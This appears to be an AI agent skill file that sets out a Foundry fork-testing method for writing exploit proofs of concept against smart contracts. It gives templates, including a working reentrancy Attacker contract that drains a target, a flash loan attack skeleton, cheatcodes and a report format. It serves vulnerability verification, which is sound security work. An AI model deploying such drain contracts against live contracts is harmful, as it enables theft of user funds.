---
name: solidity-poc
description: >
  Foundry-based Proof of Concept (POC) development for smart contract vulnerabilities.
  Provides templates, cheatcodes reference, and methodology for writing exploit POCs
  using Foundry fork testing against real on-chain state. This skill should be used
  when writing POC tests for vulnerabilities, reproducing exploits, or verifying
  security findings with concrete test cases.
  Triggers include: "write POC", "exploit POC", "foundry POC", "forge test",
  "fork test", "reproduce exploit", "vulnerability POC", "flash loan attack",
  "reentrancy POC", "写POC", "漏洞验证", "攻击复现", "exploit test".
---

# solidity-poc

Foundry-based POC development methodology for proving smart contract vulnerability exploitability.

## Requirements

| Requirement | Description |
|-------------|-------------|
| **Foundry Only** | Use `forge test` — Hardhat is forbidden for POC |
| **Fork Mode** | Must fork the actual network where contract is deployed |
| **Pinned Block** | Must specify exact block number for reproducibility |
| **Real State** | Test against real on-chain state, not mocks |

## Setup

POC projects live in the shared solidity analysis workspace at `~/.solidity-analyzer/poc/{protocol}/`.

```bash
# Initialize POC project in standard location
mkdir -p ~/.solidity-analyzer/poc/{protocol}
cd ~/.solidity-analyzer/poc/{protocol}
forge init . --template https://github.com/foundry-rs/forge-template

# Contract sources fetched by etherscan-contract-fetcher are at:
# ~/.solidity-analyzer/contracts/{chainId}/{address}/
```

## Running POC Tests

```bash
# Set RPC URL (MUST use archive node for pinned block)
export ETH_RPC_URL="https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY"

# Run all POC tests with fork
forge test --match-contract POC -vvvv \
  --fork-url $ETH_RPC_URL \
  --fork-block-number 19000000

# Run specific POC file
forge test --match-path test/poc/Reentrancy.t.sol -vvvv \
  --fork-url $ETH_RPC_URL \
  --fork-block-number 19000000

# Run with gas report
forge test --match-test test_exploit --gas-report \
  --fork-url $ETH_RPC_URL \
  --fork-block-number 19000000
```

## POC Template: Basic Exploit

```solidity
// test/poc/Exploit.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IVulnerable {
    function deposit() external payable;
    function withdraw() external;
    function balanceOf(address) external view returns (uint256);
}

contract ExploitPOC is Test {
    // ============ CONSTANTS - MUST BE FILLED ============
    address constant TARGET = 0x1234567890123456789012345678901234567890;
    uint256 constant FORK_BLOCK = 19000000; // MUST specify for reproducibility

    // ============ STATE ============
    IVulnerable public vulnerable;

    function setUp() public {
        // Fork mainnet at specific block
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
        vm.label(TARGET, "VulnerableContract");
        vulnerable = IVulnerable(TARGET);
    }

    function test_exploit() public {
        // 1. Record initial state
        uint256 targetBalanceBefore = address(TARGET).balance;
        console.log("=== Before Attack ===");
        console.log("Target balance:", targetBalanceBefore);

        // 2. Execute attack
        // ... attack logic here ...

        // 3. Verify exploit success
        uint256 targetBalanceAfter = address(TARGET).balance;
        console.log("=== After Attack ===");
        console.log("Target balance:", targetBalanceAfter);

        // Assert exploit succeeded
        assertLt(targetBalanceAfter, targetBalanceBefore, "Exploit failed: target not drained");
    }
}
```

## POC Template: Reentrancy

```solidity
contract ReentrancyPOC is Test {
    address constant TARGET = 0x...;
    uint256 constant FORK_BLOCK = 19000000;

    IVulnerable public vulnerable;
    Attacker public attacker;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
        vulnerable = IVulnerable(TARGET);
        attacker = new Attacker(TARGET);
        vm.deal(address(attacker), 1 ether);
    }

    function test_reentrancy_exploit() public {
        uint256 before = address(TARGET).balance;
        attacker.attack{value: 0.1 ether}();
        uint256 after_ = address(TARGET).balance;
        assertLt(after_, before, "Exploit failed");
    }
}

contract Attacker {
    address public target;
    uint256 public attackCount;

    constructor(address _target) { target = _target; }

    function attack() external payable {
        IVulnerable(target).deposit{value: msg.value}();
        IVulnerable(target).withdraw();
    }

    receive() external payable {
        if (address(target).balance >= 0.1 ether && attackCount < 10) {
            attackCount++;
            IVulnerable(target).withdraw();
        }
    }
}
```

## POC Template: Flash Loan

```solidity
contract FlashLoanPOC is Test {
    address constant FLASH_LOAN_PROVIDER = 0x...;  // e.g., Aave, dYdX
    address constant TARGET = 0x...;
    address constant TOKEN = 0x...;
    uint256 constant FORK_BLOCK = 19000000;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);
    }

    function test_flashLoanAttack() public {
        uint256 balanceBefore = IERC20(TOKEN).balanceOf(address(this));
        console.log("Balance before:", balanceBefore);

        // Execute flash loan
        // IFlashLoanProvider(FLASH_LOAN_PROVIDER).flashLoan(...);

        uint256 balanceAfter = IERC20(TOKEN).balanceOf(address(this));
        console.log("Balance after:", balanceAfter);
        assertGt(balanceAfter, balanceBefore, "Attack failed");
    }

    // Flash loan callback
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // 1. Manipulate price oracle
        // 2. Exploit vulnerable contract
        // 3. Repay flash loan + fee
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}
```

## POC Template: Multi-Chain Fork

```solidity
contract CrossChainPOC is Test {
    uint256 mainnetFork;
    uint256 arbitrumFork;

    function setUp() public {
        mainnetFork = vm.createFork(vm.envString("ETH_RPC_URL"), 19000000);
        arbitrumFork = vm.createFork(vm.envString("ARBITRUM_RPC_URL"), 180000000);
    }

    function test_crossChainExploit() public {
        vm.selectFork(mainnetFork);
        // ... mainnet operations ...

        vm.selectFork(arbitrumFork);
        // ... arbitrum operations ...
    }
}
```

## Foundry Cheatcodes Reference

### Identity & Funds

```solidity
vm.prank(whale);                    // Impersonate for next call
vm.startPrank(admin);               // Persistent impersonation
vm.stopPrank();                     // Stop impersonation
vm.deal(attacker, 100 ether);       // Deal ETH
deal(address(token), attacker, 1000000e18); // Deal ERC20
```

### Time & Block

```solidity
vm.warp(block.timestamp + 1 days);  // Warp time
vm.roll(block.number + 100);        // Roll block number
```

### Assertions & Expectations

```solidity
vm.expectRevert("Unauthorized");    // Expect revert
vm.expectEmit(true, true, false, true); // Expect event
```

### State Management

```solidity
uint256 snapshot = vm.snapshot();    // Snapshot state
vm.revertTo(snapshot);              // Revert to snapshot

vm.record();                        // Start recording storage access
vulnerable.someFunction();
(bytes32[] memory reads, bytes32[] memory writes) = vm.accesses(address(vulnerable));
```

### Fork Management

```solidity
uint256 forkId = vm.createFork(rpcUrl, blockNumber); // Create fork
vm.selectFork(forkId);              // Switch fork
vm.createSelectFork(rpcUrl, blockNumber); // Create and switch
```

## POC Results Documentation

After running POC tests, document results:

```markdown
# POC Test Results

## Vulnerability: [Title]

### Summary
- **Severity**: Critical/High/Medium/Low
- **Type**: Reentrancy/Access Control/Logic Error/etc.
- **Affected Contract**: ContractName.sol
- **Affected Function**: `vulnerableFunction()`

### Environment
- **Chain**: Ethereum (ID: 1)
- **Fork Block**: 19000000
- **RPC**: Archive node

### Reproduction Steps
1. Deploy attacker contract
2. Call attack function with X ETH
3. Observe: target drained of Y ETH

### Test Output
[Paste forge test -vvvv output]

### Root Cause
[Technical explanation of why the vulnerability exists]

### Recommendation
[How to fix the vulnerability]
```

## Reference Repositories

| Repository | Description |
|------------|-------------|
| [Damn Vulnerable DeFi](https://github.com/theredguild/damn-vulnerable-defi) | DeFi-specific CTF challenges |
| [Ethernaut](https://github.com/OpenZeppelin/ethernaut) | Solidity security CTF |
| [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs) | Real-world exploit reproductions |

## Anti-Patterns

1. **DO NOT** use Hardhat for POC — Foundry fork testing is mandatory
2. **DO NOT** use mocks instead of real on-chain state
3. **DO NOT** omit block number — POC must be reproducible at a specific block
4. **DO NOT** skip the assertion step — every POC must prove the exploit with `assert*`
5. **DO NOT** test against latest block — pin to a specific block for reproducibility
